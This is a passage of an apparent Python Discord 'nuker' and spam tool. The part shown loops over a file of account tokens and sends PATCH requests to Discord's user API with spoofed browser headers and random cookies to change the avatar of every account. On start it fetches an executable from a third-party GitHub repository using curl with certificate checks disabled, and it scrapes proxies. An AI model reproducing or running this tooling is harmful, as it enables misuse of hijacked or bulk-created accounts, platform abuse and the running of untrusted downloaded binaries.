1NBcgLCWYgTQlqxMhmBli4NcsCJmJIIYEkPkYMfPmIcc/m916a/ZW67F3LNt3d4z9kMLsrDT4+sIeX466W30lnptQ8DqgK0dR0/WeqsbRLK9tMuOtkNPSVi2URkg0H7GrVXP2/QLd2+w6xbXc/Tjfltu1ey6xy3060rmlb0dU0dVr2JpU+r6li3Fq7byVfMplOqFpTWLTNmrdKhr+g3YNbc2B1e2dD3Ra12jmIZLelXrN51/QlPXl2Zp1sPRe6H3HUA+cCq15bDSWMWJNeoPIDpXvykZoOnezMlvwPhZOTDR2kT7irZIrUYy9zpX1tBnyF/Ni/UvKyvKRskblhRsjFdP3Vu7dS7tSHQ6p2HL3a8gLGRRtAdqrBz4Eb9A/Zfzmz+JhF+tWd7ZEpXAkMzYHrPdeqdyqxc6xv5uyr2QbAq2B+7rxPjxFui347tM/3D/u7VdJ/uH9v5jzuDm0c2fjjjjjjjjjmmu4vIbpHx/pX33cfZuTwQXwunGGuLKN15aMYrkc2jzYSFaG+mT8H+49NVnT+0cjvj/GN6t1btXd+o9Ipzf7Z2LLwq/wAZMWN6yMW7QjPgoo5yoboaLInz5VQq2W+IKfZ4EpjVe0d36l0urNvs+/nZC/bJrVZfBXLER58xVoJhl22X7S/bWrtL9pfj8T4izsOnJfU37oz/AHY7M7vpLxqxdBGJm9m9EyfafkBoRLCG3zN5HRlstK8XrvGWDP2+VtL6sMKLJIJSvaqW1lDna62Oqx9RHasvuDM/c6f6eYlAU5utEhkdq79fCyF7OujTcu5XR1rEfE28i3o1LD7DXM+2D227S8iuzurH6/drqds/T9fqfQ8ylCqWqURn9g7ldU4bFC2FRkWEhj5jo+5oWLaGkZmyExM2HjSmlrhZwq8AMqxLtyRAxRSLawjAiPtJx4GRTWJsVUFW1cZZsjHEkx1tcAAyaV7QwhR0jgjtchZqSlTHttGpS1nZfCBfYMAgSe4aqK1YWtmJYyK9euiDIoShS/asbXIWaUJUx7bTFKWs7LxSLrBgECT3DXUiuLXFEsYKEJTBlMKUsPaAwS+uX3N1S3prK9Gy3w9j20Rt6PcCZyvRhZGfogK66Ant9BIyRG1DLGKyeJUjzfkbZK+eYcZwQxRUNNvrK7d1gOlUOlNuA/tNjczN2tnogWto0qlbSrMuX5gvFQLIXSTUA/8Af2pkjUuULc0Kf/Vx2jrv+Gs3qU3Af2OdWrrBRTAtOlUUiyorFwoKIrfOL5XXWXlr/JkK/iA2DVt5zV5z844444444457mZ02ixmgqNXkry1zWmoD4LSkvqM4mstqqwFejxzADxJIiBp4nJ/WSKRq+yq1fdrnIv252loZF6rqZV21naNFwWad6k9la1VeufINQ9RCxZjP8EJRPiZifMTMT9dC/dy7lbRzbdijfpuCxUuVHGizXeufcDUuWQmsxn+CEon+n8TMcsM+Jvrh/UDq8Z5b50syWCOESLuDD10DyCEajWIVs8UP9aNZURHyl22PRPlX44oMgj/lJfe/0x+scRVXyfVKg02DArHteLWXPyf5B+TXxVQuAKI+RjbWPBQUyClY4eCbN1PTj6sySqvlepFFj5AQUPZslIS04iPHyamUHsAj/qyzm+3z+IHOkvcczrdU+Q/QfkBVNK6o7SwvYQxQiyk1NVcBy3go0iKjmXWTOUfRU6uav9xrmoCl/ByK6L8XIq3Q6v3vpvdaw2Oq9lxtwDTDTRSupO6hR+R8Xs1khoUSKImCTdqoZ7Z8kHtKPNu+u936X3St7uu9hx9tbVzLKqLKptguY/MWs1/x3q/mPzIWay58fn2+ORp+aHpneNLaDY+Q2I2BXiprMbVWmqstZkpZQsgsw0Essk8+eBIBKrrA97vqDrkTaso40trPoWhhDIZYC9Wfp69OnVNbveTqM9LtfIq2tWxs4xTXx/elZsNrsxLK5VrDymEqnEfTY5zRAadyy4VnAvqp6CdEClp92yNRnp7oZdd+g+/nkQZkmAyUnNNRqah7in4w/TmpNrWRHxOYcCUA2J9Srzm6+gYJQ+R24sRo2/E1NtBn+xZ3xJIsiNcXv6fTHNcvv+PyMLSZkftEyVsbWIlGMf6h/WjDXKqff9iyE+YmdpWd2FxRJ++fNjep6VmCmfx7odBwM+yCgPxynOT66+reKArp9513LGPbEasU9svbE+Yj37Na+yP7eYOCEf2iUREeN7h+tB5zDQsim1OAsHsaiOJM66pGTSKieyue0BwI6Od/y5I4I2+//i1qf45uiPq59ZEgIMv4NooiIlr8GsJlMefyUVmV1eZ/r7VjH4jxEfnzt6/ql9XQGBLTyHTEREmzDpQU/wCswkVB5n+vgIj+0Rz5L9aHzmIikjh1HX4D3sc1s4nXdK+WJXIqJJGhrjIFexV92pJDIz3RPyY5PdF8v+rr1kaBCu9gVimJiGowa5GMzHiJiLLLCpmJ/MQSyHz/ADEx+OGfVJ6umMiOnkJmYmINeHSkhmY8eY+WGh5j+Y8jMeY/MTH45ofb+pX5zdgwPDvfI3b1osjVjc3EwZ/ruZkTpEkVrTMDTZo9yt9kakjy3TOj94nSqx70dpex9RHrRuLhVzv+vWCPxE4qc7rzhj3++PFjBpZtmZifxBE6Tkf2Scj5jmoa3rr6tbQEu53jXSsokZjLipiz7ZmJmIPHrUGT/HjzLPdMeRkvEz5sE+GXpoeMYlHj/IPX60jyx1+wq6zWVW22T5DsashcEcsBYWWOIPmPsAnoopDtqbcnV54is/XU1iLJBDej0n+nz04r1MzvWlqM9UtfWrV9Otu7Xl+QRNATB9bJsG822F/lRltvvPS5USNahaUS13O9LPQXoIU8vuuppH6i6WnWr6VbT0pJuXBMASE10Gscb3pKJUz9UbZYlypGa9V6iAZHe2fIzoboStkO7a7Vw+BigGSeGst7oRt8XA1P6tp8sG4nRW7vxT3ZBUVRkqsarmx/g1ypPnaO99N6Wg7Pa+zY+HArlwpvXVDfeEePM080JZo3i/MT8dKrYZMeZgJiJmJz7H3rpnTUSzsfYsjHFYQQVn2l/eMCI/EVs5PyXbE+P4CvWZPj8+PEeeQSeWnrguNDtMX4k54wB5DJhJe39tXwRlwNcjmKTjMYR9mNkqorZBbbW/2iVHxy5T8/jJZS71P+scTVZyPS2g0GHBqLtm1XAZXHko+XHxm/JBFMew1WtiI9n7wZjyXsaNQfUj6sieqxlem9Jtf3iSi7NqpCHDExMSeXmF8ggX8Suzo+6R/MTnxPtOK9Ok0uh2N9banV3dppNJfHT2d1e3ZxFla2tgU9XkGHHFySkEzyuX3dJLI5fZEans1qIlENHS0Ni/b1NW7a0dK+9lm7euvZZt2rDS9zHPe0iY1hzPmSIpn+I/iIjlLL165p3LOho2rF69ccb7Vu0032LDmT7ja5zCI2GU/yRFM/0/iI54nPi58vHHHHHHHHHHHHHHHP1gnnFmiJGmlHIgkZNBPBI+KaGaNyPjliljVr45I3ojmPY5rmORHNVFRF5+gM1mJgRAYEJgYFImBjMSJCUTEiQzESJRMTExExPnn6EiAhMCIDAoIDGZEhIZ8wQlExIlExExMTExP5jmxr7ujuLU5hmI0/bHZejxcZMRseRvt3qbfMMMgcr4C2UFhakVTSYXuc+KdoiSxucrmPRVVebFe7n3DUzIxNPtfZNHGFoPHIvbupbzIcuZkHRQsWmVYaEzMgyFe8ZmZiYmeZq32fst+hGVe7DuXcsWC0c23rX7NCGhMyDIpusHXhgzMyJwv3DMzMTHnmtOa3zB8ccccccccc2dT929zZ7KwYWg7c7Oo8QLMSSNjaffaqsyo5Bk7yiyIM8FbQVEMxRMkhBMsYbZJ55HzSudI5zl2ap3TuOflhh0O2dmpYqjYxeRU3tStlrNrCa0wz02gqAbWmbGEKYk2GRlMkUzOerdp7PTzwyanY96rlLNjF5lbX0EZ4G05Y0wpKsDWE2HMmwhVEmcyRTMz55raeeYmaUkmaUgieR80888j5ZppZHK+SWWWRXPkkkeque97lc5yq5yqqqvNbMzYZGZEZmRGZmUkZmUzJERTMyRFMzJFMzMzMzM+eYMiIyIzIjMykjMpkiIinzJEUzMkUzMzMzMzM/meflz88/PHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHP/9k="

                    payload3 = {
                        'avatar':image
                    }

        url = 'https://discord.com/api/v9/users/@me'
  
        tokens = []
        token = []

        with open('tokens.txt','r') as f:
                    for line in f:
                        tokens.append(line)

                    for element in tokens:
                        token.append(element.strip())

                    length = len(token)

        for x in range(length):
                    header = {
                        "authority": "discord.com",
                        "method": "POST",
                        "path": "/api/v9/users/@me",
                        "scheme": "https",
                        "accept": "*/*",
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": "en-US",
                        "Authorization": f"{token[x]}",
                        "content-length": "0",
                        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                        "origin": "https://discord.com",
                        'referer': 'https://discord.com/channels/@me',
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin",
                        "user-agent": useragent(),
                        "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                        "x-debug-options": "bugReporterEnabled",
                        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
                    }

                    if optionsforpfp == 1:
                        r = requests.patch(url,headers=header,json=payload1)
                        if r.status_code == 200:
                            print(Fore.GREEN + f'Added | {token[x]}')
                        else:
                            print(r)
                    elif optionsforpfp == 2:
                        r = requests.patch(url,headers=header,json=payload2)
                        if r.status_code == 200:
                            print(Fore.GREEN + f'Added | {token[x]}')
                        else:
                            print(r)

                    elif optionsforpfp == 3:
                        r = requests.patch(url,headers=header,json=payload3)
                        if r.status_code == 200:
                            print(Fore.GREEN + f'Added | {token[x]}')
                        else:
                            print(r)

                    else:
                        print("Error")



#   ABOUT
    if choice == '30':
        Spinner()
        Write.Print("Hello, thanks for using LOG-YY Nuker!\nif you run into any problems make sure to let me know asap!\nDiscord: waltta#6821\nGithub: https://github.com/TT-Tutorials\n\n", Colors.white_to_green, interval=0.015)

        time.sleep(1)
        exit = input('[\x1b[95m>>\x1b[95m\x1B[37m] Press ENTER : ')
        exit = clear()
        exit = spammer()



#   THREADS
    if choice == '31':
            Spinner()
            print(f"\n[\x1b[95m#\x1b[95m\x1B[37m] Current : {Fore.RED}{threads}{Fore.RESET}")
            try:
                amount = int(
                    input(f'\n[\x1b[{Fore.GREEN}>>{Fore.WHITE}\x1b[95m\x1B[37m] Thread Amount: '))
            except ValueError:
                print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] | Invalid Amount!')
                sleep(1.5)
                spammer()
            if amount >= 40:
                print(f"[{Fore.RED}ERROR{Fore.RESET}] | Having {Fore.RED}{amount}{Fore.RESET} Will Cause Ratelimited! Try Something Lower...")
                sleep(4)
                spammer()
            elif amount >= 15:
                print(f"[\x1b[95m>>\x1b[95m\x1B[37m] Having More Than 15 Threads Can Cause Lag and Ratelimit... [{Fore.RED}{amount}{Fore.RESET}]\nContinue With High Thread?")
                yesno = input(f'\n[\x1b[{Fore.GREEN}>>{Fore.WHITE}\x1b[95m\x1B[37m] y/n?: ')
                if yesno.lower() != "y":
                    sleep(0.5)
                    spammer()
            threads = amount
            print(f"[\x1b[95m>>\x1b[95m\x1B[37m] Thread Changed to: {amount}")
            sleep(1.5)
            spammer()



#   EXIT
    if choice == '32':
            sys.exit(0)



#   AUTO DOWNLOAD DRIVERS
if __name__ == "__main__":
                import sys
                setTitle("Downloading ChromeDriver...")
                os.system("""if not exist "./chromedriver.exe" echo [-] Downloading Drivers: """)
                os.system("""if not exist "./chromedriver.exe" curl -#fkLo "./chromedriver.exe" "https://github.com/TT-Tutorials/addons/raw/main/chromedriver.exe" """)
                if os.path.basename(sys.argv[0]).endswith("exe"):
                    search_for_updates()
                    if not os.path.exists(getTempDir()+"\\cmdlok_proxies"):
                        proxy_scrape()
                    clear()
                else:
                    search_for_updates()
                    if not os.path.exists(getTempDir()+"\\cmdlok_proxies"):
                        proxy_scrape()
                    clear()
spammer()
spammer()
spammer()
spammer()
spammer()
spammer()
spammer()
spammer()
spammer()
spammer()
spammer()
